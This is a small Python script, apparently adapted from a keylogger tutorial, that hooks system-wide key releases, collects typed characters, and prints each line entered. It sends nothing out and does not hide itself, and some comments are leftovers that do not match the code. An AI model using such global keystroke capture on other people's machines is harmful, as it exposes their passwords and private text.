import keyboard
import queue
import threading


class KeyHandle:
    def __init__(self, q : queue):
        self.log = ""
        self.q = q

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        print(f"name = {name}")
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "enter":
                self.report()
            elif name == "backspace":
                self.log = self.log[:-1]
                print("[BACKSPACE]")
        else:
            if name == "decimal":
                name = "."
            if name == "space":
                # " " instead of "space"
                name = " "
            self.log += name
        # replace spaces with underscores

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.log = self.log.replace('[ENTER]\n','')
            print(f"log - {self.log}")
            self.q.put(self.log)
            self.log = ""

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    q = queue.Queue()
    keyHandle = KeyHandle(q)
    threading.Thread(target=keyHandle.start).start()

    while True:
        print(q.get())